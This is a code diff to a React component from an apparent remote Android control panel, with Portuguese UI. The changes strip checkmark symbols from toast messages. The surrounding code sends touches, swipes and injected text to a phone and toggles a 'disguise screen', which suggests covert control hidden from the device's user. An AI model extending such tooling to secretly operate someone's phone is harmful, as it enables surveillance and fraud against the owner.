@@ -500,10 +500,10 @@ export function ScreenView({ device, activeApp, onCloseApp, allDevices, onSelect
     setActiveDisguise(null);
     try {
       await api.clearDeviceDisguise(device.id);
-      showToast("✓ Tela de disfarce desativada. Aparelho normal restaurado!", "success");
+      showToast("Tela de disfarce desativada. Aparelho normal restaurado!", "success");
       triggerImmediateFrame();
     } catch {
-      showToast("✓ Tela de disfarce desativada.", "info");
+      showToast("Tela de disfarce desativada.", "info");
     }
   };
 
@@ -873,7 +873,7 @@ export function ScreenView({ device, activeApp, onCloseApp, allDevices, onSelect
     if (dist >= 16) {
       api.sendSwipe(device.id, drag.startX, drag.startY, drag.currentX, drag.currentY, duration, 720, 1280).catch(() => {});
       triggerSyncedRipple(drag.currentX, drag.currentY, drag.source);
-      showToast(`✓ Deslize executado: (${drag.startX}, ${drag.startY}) ➜ (${drag.currentX}, ${drag.currentY}) [${Math.round(dist)}px]`, "success");
+      showToast(`Deslize executado: (${drag.startX}, ${drag.startY}) -> (${drag.currentX}, ${drag.currentY}) [${Math.round(dist)}px]`, "success");
       triggerImmediateFrame();
       setTimeout(triggerImmediateFrame, 35);
       setTimeout(triggerImmediateFrame, 110);
@@ -907,7 +907,7 @@ export function ScreenView({ device, activeApp, onCloseApp, allDevices, onSelect
       api.sendTouch(device.id, drag.currentX, drag.currentY, 720, 1280).catch(() => {});
       triggerSyncedRipple(drag.currentX, drag.currentY, drag.source);
       const targetLabel = selected ? ` em "${sanitizeA11yText(selected.text || selected.name || "Elemento").slice(0, 22)}"` : "";
-      showToast(`✓ Toque preciso${targetLabel}: (${drag.currentX}, ${drag.currentY})`, "success");
+      showToast(`Toque preciso${targetLabel}: (${drag.currentX}, ${drag.currentY})`, "success");
       triggerImmediateFrame();
       setTimeout(triggerImmediateFrame, 45);
       setTimeout(triggerImmediateFrame, 140);
@@ -1032,7 +1032,7 @@ export function ScreenView({ device, activeApp, onCloseApp, allDevices, onSelect
     if (touchActive && node.clickable) {
       api.sendTouch(device.id, b.centerX, b.centerY, 720, 1280).catch(() => {});
       triggerSyncedRipple(b.centerX, b.centerY, "skeleton");
-      showToast(`✓ Toque acionado no elemento: "${sanitizeA11yText(node.text || node.name || "Alvo").slice(0, 20)}"`, "success");
+      showToast(`Toque acionado no elemento: "${sanitizeA11yText(node.text || node.name || "Alvo").slice(0, 20)}"`, "success");
       triggerImmediateFrame();
       setTimeout(triggerImmediateFrame, 60);
       setTimeout(triggerImmediateFrame, 180);
@@ -1066,7 +1066,7 @@ export function ScreenView({ device, activeApp, onCloseApp, allDevices, onSelect
 
     try {
       await api.sendText(device.id, cmd);
-      showToast(`✓ Texto injetado no celular: "${cmd}"`, "success");
+      showToast(`Texto injetado no celular: "${cmd}"`, "success");
       triggerImmediateFrame();
     } catch (err: any) {
       showToast(`Erro ao enviar texto: ${err.message}`, "info");
